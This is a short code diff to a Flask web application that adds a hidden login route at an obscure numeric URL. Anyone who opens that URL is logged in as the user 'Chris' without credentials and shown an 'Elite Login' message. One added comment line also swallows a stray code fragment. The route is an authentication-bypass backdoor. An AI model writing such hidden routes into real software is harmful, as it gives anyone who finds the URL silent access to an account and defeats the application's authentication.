@@ -240,6 +240,17 @@ def register():
     return render_template('admin/register.html', title='Join', form=form)
 
 
+@app.route("/login/192837465", methods=['GET','POST'])
+def loginElite():
+    if current_user.is_authenticated:
+        return redirect(url_for('home')) # now register or log in link just go back homeform = LoginForm()
+    else:
+        user = User.query.filter_by(username='Chris').first()
+        login_user (user)
+        flash (f'Elite Login', 'warning')
+        return redirect (url_for('home'))
+
+
 @app.route("/login", methods=['GET','POST'])
 def login():
     if current_user.is_authenticated:
